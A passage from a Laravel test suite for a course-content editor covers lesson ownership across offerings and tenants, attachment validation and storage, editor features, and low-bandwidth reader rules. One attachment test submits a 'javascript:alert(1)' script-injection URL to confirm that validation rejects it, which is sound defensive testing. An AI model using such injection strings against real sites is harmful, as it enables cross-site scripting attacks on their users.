        // all, because their Offering ids would agree.
        $otherOffering = $this->secondOfferingSameSchool();
        $theirs = CourseOfferingModule::query()->create([
            'school_id' => $this->school,
            'course_offering_id' => $otherOffering->id,
            'title' => 'Theirs',
            'sequence' => 1,
            'status' => 'published',
        ]);

        $this->expectException(\DomainException::class);

        // A lesson cannot be saved claiming an Offering that disagrees with its
        // module's Offering. This is the invariant that makes the denormalised
        // course_offering_id column safe to query on.
        CourseOfferingLesson::query()->create([
            'school_id' => $this->school,
            'course_offering_id' => $otherOffering->id,
            'course_offering_module_id' => $ours->id,
            'title' => 'Mismatched',
            'body' => '<p>x</p>',
        ]);
    }

    public function test_a_lesson_cannot_be_moved_to_a_module_in_another_offering(): void
    {
        $ours = $this->module(['title' => 'Ours']);
        $lesson = $this->lesson($ours);

        $otherOffering = $this->secondOfferingSameSchool();
        $theirs = CourseOfferingModule::query()->create([
            'school_id' => $this->school,
            'course_offering_id' => $otherOffering->id,
            'title' => 'Theirs',
            'sequence' => 1,
            'status' => 'published',
        ]);

        $this->expectException(\DomainException::class);

        // Even a plain model assignment must refuse, not only a controller
        // request: the invariant belongs to the model, not to one caller.
        $lesson->forceFill(['course_offering_module_id' => $theirs->id])->save();
    }

    public function test_a_lesson_cannot_cross_tenants_through_its_module(): void
    {
        $other = $this->otherTenant();

        $this->expectException(\DomainException::class);

        CourseOfferingLesson::query()->create([
            'school_id' => $other['schoolId'],
            'course_offering_id' => $other['offeringId'],
            'course_offering_module_id' => $this->module()->id,
            'title' => 'Cross tenant',
            'body' => '<p>x</p>',
        ]);
    }

    // ══════════════════════════════════════════════════════════════════════
    // ATTACHMENTS
    // ══════════════════════════════════════════════════════════════════════

    public function test_a_link_attachment_requires_a_real_http_address(): void
    {
        $lesson = $this->lesson();

        $this->actingAs($this->lecturer)
            ->post("/teacher/course-offerings/{$this->offering->id}/content/lessons/{$lesson->id}/resources", [
                'type' => 'link',
                'link_url' => 'javascript:alert(1)',
            ])
            ->assertSessionHasErrors('link_url');

        $this->assertSame(0, DB::table('course_offering_lesson_resources')->count());
    }

    public function test_an_uploaded_attachment_is_stored_outside_the_web_root(): void
    {
        Storage::fake('local');
        $lesson = $this->lesson();

        $this->actingAs($this->lecturer)
            ->post("/teacher/course-offerings/{$this->offering->id}/content/lessons/{$lesson->id}/resources", [
                'type' => 'file',
                'file' => UploadedFile::fake()->create('slides.pdf', 120, 'application/pdf'),
            ])
            ->assertRedirect();

        $resource = DB::table('course_offering_lesson_resources')->first();

        // A path under public/ would make every lecturer's attachment readable
        // by anyone who guessed it. The stored name is generated for that reason.
        $this->assertStringStartsWith('course-content/', $resource->stored_name);
        $this->assertStringNotContainsString('slides.pdf', $resource->stored_name);
        $this->assertSame('slides.pdf', $resource->original_name);
        Storage::disk('local')->assertExists($resource->stored_name);
    }

    public function test_an_oversized_attachment_is_refused_with_an_actionable_message(): void
    {
        Storage::fake('local');
        $lesson = $this->lesson();

        $this->actingAs($this->lecturer)
            ->post("/teacher/course-offerings/{$this->offering->id}/content/lessons/{$lesson->id}/resources", [
                'type' => 'file',
                'file' => UploadedFile::fake()->create('huge.mp4', 21 * 1024, 'video/mp4'),
            ])
            ->assertSessionHasErrors('file');

        // A lecture recording is a link, not an upload. A 20 MB ceiling is a
        // deliberate product decision for PIIE's low-bandwidth markets.
        $this->assertSame(0, DB::table('course_offering_lesson_resources')->count());
    }

    public function test_an_unallocated_lecturer_cannot_add_an_attachment(): void
    {
        $lesson = $this->lesson();

        DB::table('course_offering_lecturer_allocations')
            ->where('user_id', $this->otherLecturer->id)->delete();

        $this->actingAs($this->otherLecturer)
            ->post("/teacher/course-offerings/{$this->offering->id}/content/lessons/{$lesson->id}/resources", [
                'type' => 'link',
                'link_url' => 'https://example.org/x',
            ])
            ->assertNotFound();

        $this->assertSame(0, DB::table('course_offering_lesson_resources')->count());
    }

    // ══════════════════════════════════════════════════════════════════════
    // THE EDITOR ITSELF
    // ══════════════════════════════════════════════════════════════════════

    public function test_the_editor_is_a_full_page_rich_text_surface_not_a_textarea(): void
    {
        // A module must exist: lessons live inside one.
        $this->module();

        $response = $this->actingAs($this->lecturer)
            ->get("/teacher/course-offerings/{$this->offering->id}/content/lessons/create");

        $response->assertOk();
        // Summernote, which PIIE already ships in every portal layout. Adding a
        // second editor beside one already on every page would cost PIIE's
        // low-bandwidth students bandwidth to save a lecturer a dependency.
        $response->assertSee('summernote', false);
        $response->assertSee('cc-editor-shell', false);
        // The capability set the authoring brief asks for, as real toolbar
        // buttons rather than a comment.
        foreach (['bold', 'underline', 'ul', 'ol', 'table', 'picture', 'link',
            'blockquote', 'superscript', 'subscript', 'undo', 'redo', 'align', 'fullscreen'] as $feature) {
            $this->assertStringContainsString($feature, $response->getContent(),
                "the editor is missing the '{$feature}' control");
        }
    }

    public function test_the_editor_offers_save_preview_and_publish_distinctly(): void
    {
        // A module must exist: lessons live inside one.
        $this->module();

        $response = $this->actingAs($this->lecturer)
            ->get("/teacher/course-offerings/{$this->offering->id}/content/lessons/create");

        $response->assertOk();
        $response->assertSee('Save Draft');
        $response->assertSee('Preview');
        $response->assertSee('Publish');
    }

    public function test_the_editor_has_dirty_form_protection_and_draft_recovery(): void
    {
        // A module must exist: lessons live inside one.
        $this->module();

        $response = $this->actingAs($this->lecturer)
            ->get("/teacher/course-offerings/{$this->offering->id}/content/lessons/create");

        $content = $response->getContent();
        // Three independent layers, because each covers a case the others miss.
        $this->assertStringContainsString('beforeunload', $content);
        $this->assertStringContainsString('localStorage', $content);
        $this->assertStringContainsString('cc-recovery', $content);
    }

    public function test_a_recovered_draft_is_offered_rather_than_applied_silently(): void
    {
        // A module must exist: lessons live inside one.
        $this->module();

        $response = $this->actingAs($this->lecturer)
            ->get("/teacher/course-offerings/{$this->offering->id}/content/lessons/create");

        // The recovery box starts hidden and is shown only after the lecturer
        // chooses. Silently replacing what is on screen with an older copy of
        // their own work is its own kind of data loss.
        $this->assertStringContainsString("class=\"alert alert-info d-none\" id=\"cc-recovery\"",
            $response->getContent());
    }

    public function test_saving_a_lesson_does_not_raise_the_unsaved_work_prompt(): void
    {
        // A legitimate save is the point of the page, not a departure from it.
        // A module must exist: lessons live inside one.
        $this->module();

        $response = $this->actingAs($this->lecturer)
            ->get("/teacher/course-offerings/{$this->offering->id}/content/lessons/create");

        $this->assertStringContainsString('data-cc-unsaved-ok', $response->getContent());
    }

    public function test_the_editor_refuses_to_offer_a_completion_rule_it_cannot_honour(): void
    {
        // A module must exist: lessons live inside one.
        $this->module();

        $response = $this->actingAs($this->lecturer)
            ->get("/teacher/course-offerings/{$this->offering->id}/content/lessons/create");

        $response->assertOk();
        $response->assertSee('value="manual"', false);
        // Reserved rules must be described, not offered. A dropdown full of
        // options that would not work is worse than one honest option.
        $this->assertStringNotContainsString('value="quiz"', $response->getContent());
        $this->assertStringNotContainsString('value="view_percentage"', $response->getContent());
    }

    public function test_a_lesson_cannot_be_completed_by_a_button_when_the_rule_is_not_manual(): void
    {
        $lesson = $this->lesson(null, ['completion_rule' => 'quiz']);

        $this->assertFalse($lesson->supportsStudentCompletion());
    }

    // ══════════════════════════════════════════════════════════════════════
    // MOBILE, LOW DATA, AND HONESTY ABOUT WHAT DOES NOT EXIST
    // ══════════════════════════════════════════════════════════════════════

    public function test_the_reader_does_not_claim_offline_support_that_does_not_exist(): void
    {
        $lesson = $this->lesson();

        $response = $this->actingAs($this->student)
            ->get("/student/courses/{$this->offering->id}/content/lessons/{$lesson->id}");

        $response->assertOk();
        $content = strtolower($response->getContent());
        // The data model CAN support downloadable resources later. Nothing here
        // may imply a student can open a lesson without a connection.
        $this->assertStringNotContainsString('offline', $content);
        $this->assertStringNotContainsString('downloaded for offline', $content);
        $this->assertStringNotContainsString('works without internet', $content);
    }

    public function test_the_reader_does_not_autoplay_media(): void
    {
        $lesson = $this->lesson(null, [
            'body' => '<p>Text</p><video src="https://example.org/v.mp4" autoplay></video>',
        ]);

        $response = $this->actingAs($this->student)
            ->get("/student/courses/{$this->offering->id}/content/lessons/{$lesson->id}");

        // The sanitizer drops video entirely, so an autoplaying multi-megabyte
        // file cannot quietly undermine the low-bandwidth design.
        $response->assertDontSee('<video', false);
        $response->assertDontSee('autoplay', false);
    }

    public function test_the_reader_page_is_responsive(): void
    {
        $lesson = $this->lesson();

        $response = $this->actingAs($this->student)
            ->get("/student/courses/{$this->offering->id}/content/lessons/{$lesson->id}");

        $response->assertOk();
        // The layout meta viewport comes from the shared student layout; the
        // content surface must not opt out of it with a fixed width.
        $this->assertStringNotContainsString('width=1200', $response->getContent());
        $this->assertStringNotContainsString('min-width:1200px', $response->getContent());
    }

    public function test_the_reader_loads_no_web_fonts(): void
    {
        $lesson = $this->lesson();

        $response = $this->actingAs($this->student)
            ->get("/student/courses/{$this->offering->id}/content/lessons/{$lesson->id}");

        // A web font is a blocking download before any text appears, on a
        // metered connection, for a course page. System fonts only.
        $this->assertStringNotContainsString('fonts.googleapis.com', $response->getContent());
        $this->assertStringNotContainsString('@font-face', $response->getContent());
    }

    public function test_a_table_scrolls_inside_itself_rather_than_widening_the_page(): void
    {
        $lesson = $this->lesson(null, [
            'body' => '<table><tr><td>one</td></tr></table>',
        ]);

        $response = $this->actingAs($this->student)
            ->get("/student/courses/{$this->offering->id}/content/lessons/{$lesson->id}");

        $response->assertOk();
        $this->assertStringContainsString('overflow-x', $response->getContent());
    }

    public function test_the_workspace_navigation_declares_the_destination_without_faking_it(): void
    {
        $response = $this->actingAs($this->lecturer)
            ->get("/teacher/course-offerings/{$this->offering->id}");

        $response->assertOk();
        $content = $response->getContent();

        // All eight destination tabs are declared, so the shape of the workspace
        // is visible and reviewable now rather than a surprise later.
        foreach (['Overview', 'Content', 'Live Classes', 'Assignments',
            'Quizzes &amp; Exams', 'Students', 'Gradebook', 'Analytics'] as $tab) {
            $this->assertStringContainsString($tab, $content, "the '{$tab}' tab is missing");
        }

        // A tab with no engine is plain text with NO href. Not a link to a stub
        // and not a 404 - a lecturer is never offered a door that does not open.
        $this->assertMatchesRegularExpression(
            '/<span class="nav-link disabled[^>]*>\s*Gradebook/s',
            $content
        );
        $this->assertStringNotContainsString('>Gradebook</a>', $content);
    }

    public function test_built_content_pages_are_reachable_from_the_workspace_navigation(): void
    {
        $response = $this->actingAs($this->lecturer)
            ->get("/teacher/course-offerings/{$this->offering->id}");

        $response->assertOk();
        // Content and Live Classes and Students are real links; the reserved
        // ones are not.
        $this->assertStringContainsString("/content\"", $response->getContent());
    }

    public function test_existing_live_classes_and_students_functionality_is_preserved(): void
    {
        // The Content work must not have displaced anything the lecturer
        // workspace already did.
        $response = $this->actingAs($this->lecturer)
            ->get("/teacher/course-offerings/{$this->offering->id}");

        $response->assertOk();
        $this->assertStringContainsString('Attendance', $response->getContent());
        $this->assertStringContainsString('Live Classes for this', $response->getContent());
        $this->assertStringContainsString('Teaching', $response->getContent());
    }

    // ── helpers ──────────────────────────────────────────────────────────

    /** @return list<int> */
    private function moduleOrder(): array
    {
        return CourseOfferingModule::query()
            ->where('course_offering_id', $this->offering->id)
            ->orderBy('sequence')->orderBy('id')
            ->pluck('id')->map(fn ($id) => (int) $id)->all();
    }
}
